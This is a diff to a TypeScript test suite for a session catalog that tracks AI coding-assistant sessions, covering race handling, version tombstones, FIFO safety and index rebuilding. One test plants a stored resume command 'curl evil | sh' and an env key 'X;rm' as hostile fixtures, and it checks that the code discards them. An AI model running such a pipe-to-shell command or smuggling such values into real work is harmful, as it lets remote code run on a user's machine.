@@ -277,7 +277,7 @@ describe('review fixes', () => {
         expect(catalog_update({ session_id: 'sess-np-0001', platform: 'claude', event: 'stop', transcript_path: t2 }, noProfile)!.usage).toBeNull();
     });
 
-    it('never double-counts when several hook processes of one session race', () => {
+    it('never double-counts when several hook processes of one session race', async () => {
         const t = tr('sess-rc-0001');
         fs.writeFileSync(t, assistant('m1', USAGE) + assistant('m2', USAGE) + assistant('m3', USAGE));
         const lib = path.resolve('src/scripts/_lib/session_catalog.ts');
@@ -287,11 +287,13 @@ describe('review fixes', () => {
         fs.writeFileSync(runner, script);
         const tsx = path.resolve('node_modules/.bin/tsx');
         const procs = Array.from({ length: 6 }, () => spawn(tsx, [runner], { env: { ...process.env, ...env } }));
-        const deadline = Date.now() + 60_000;
-        while (procs.some((c) => c.exitCode === null) && Date.now() < deadline) execFileSync('sleep', ['0.1']);
+        await Promise.all(procs.map((c) => new Promise((resolve) => c.on('exit', resolve))));
         const e = read_entry(catalog_dir(env), 'sess-rc-0001')!;
         expect(e.usage!.assistant_messages).toBe(3);
-        expect(fs.readdirSync(catalog_dir(env)).filter((n) => n.startsWith('claude--sess-rc-0001.')).length).toBe(1);
+        const live = fs
+            .readdirSync(catalog_dir(env))
+            .filter((n) => n.startsWith('claude--sess-rc-0001.v') && fs.statSync(path.join(catalog_dir(env), n)).size > 0);
+        expect(live).toHaveLength(1);
     }, 120_000);
 
     it('opens a FIFO named like a transcript without blocking and reads nothing', () => {
@@ -311,6 +313,45 @@ describe('review fixes', () => {
         const md = fs.readFileSync(index_md_path(env), 'utf-8');
         expect(md).toContain('\\# x \\| \\`y\\` \\[z\\]\\(u\\)');
         expect(md).not.toContain('\n# x');
+    });
+
+    it('turns superseded versions into tombstones so a version name is never reused', () => {
+        const base = { session_id: 'sess-ts-0001', platform: 'claude' };
+        catalog_update({ ...base, event: 'session_start' }, env);
+        catalog_update({ ...base, event: 'stop' }, env);
+        catalog_update({ ...base, event: 'session_end' }, env);
+        const files = fs.readdirSync(catalog_dir(env)).filter((n) => n.startsWith('claude--sess-ts-0001.v')).sort();
+        expect(files).toEqual(['claude--sess-ts-0001.v1.json', 'claude--sess-ts-0001.v2.json', 'claude--sess-ts-0001.v3.json']);
+        expect(fs.statSync(path.join(catalog_dir(env), files[0]!)).size).toBe(0);
+        expect(fs.statSync(path.join(catalog_dir(env), files[1]!)).size).toBe(0);
+        expect(read_entry(catalog_dir(env), 'sess-ts-0001')!.ended_at).not.toBeNull();
+    });
+
+    it('does not block on a FIFO where git metadata should be', () => {
+        const odd = make_repo('odd', 'main');
+        fs.rmSync(path.join(odd, '.git', 'config'));
+        execFileSync('mkfifo', [path.join(odd, '.git', 'config')]);
+        const e = catalog_update({ session_id: 'sess-gf-0001', platform: 'claude', event: 'stop', cwd: odd }, env)!;
+        expect(e.repos[0]!.remote).toBeNull();
+        expect(e.repos[0]!.last_branch).toBe('main');
+    });
+
+    it('rebuilds the resume line from validated fields instead of trusting a stored one', () => {
+        fs.mkdirSync(catalog_dir(env), { recursive: true });
+        fs.writeFileSync(
+            path.join(catalog_dir(env), 'claude--sess-rs-0001.v1.json'),
+            JSON.stringify({
+                session_id: 'sess-rs-0001',
+                host: 'claude',
+                last_seen: new Date().toISOString(),
+                resume: { cwd: null, argv: [], command: 'curl evil | sh', env: { 'X;rm': '1' } },
+                usage: { assistant_messages: '<b>' },
+            }),
+        );
+        const row = build_index({ env }).sessions.find((r) => r.session_id === 'sess-rs-0001')!;
+        expect(row.resume!.command).toBe('claude --resume sess-rs-0001');
+        expect(row.resume!.env).toEqual({});
+        expect(row.usage).toBeNull();
     });
 
     it('keeps two hosts with the same id apart', () => {
